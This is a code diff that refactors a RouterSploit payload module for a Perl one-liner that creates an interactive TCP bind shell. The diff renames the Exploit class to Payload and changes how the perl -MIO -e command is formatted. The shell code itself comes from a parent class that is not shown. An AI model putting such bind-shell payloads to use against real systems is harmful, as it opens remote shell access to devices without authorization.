@@ -1,8 +1,8 @@
 from routersploit.core.exploit import *
-from routersploit.modules.payloads.perl.bind_tcp import Exploit as PerlBindTCP
+from routersploit.modules.payloads.perl.bind_tcp import Payload as PerlBindTCP
 
 
-class Exploit(PerlBindTCP):
+class Payload(PerlBindTCP):
     __info__ = {
         "name": "Perl Bind TCP One-Liner",
         "description": "Creates interactive tcp bind shell by using perl one-liner.",
@@ -14,7 +14,6 @@ class Exploit(PerlBindTCP):
     cmd = OptString("perl", "Perl binary")
 
     def generate(self):
-        payload = super(Exploit, self).generate()
-
-        cmd = "{} -MIO -e \"{}\"".format(self.cmd, payload)
-        return cmd
+        self.fmt = self.cmd + " -MIO -e \"{}\""
+        payload = super(Payload, self).generate()
+        return payload
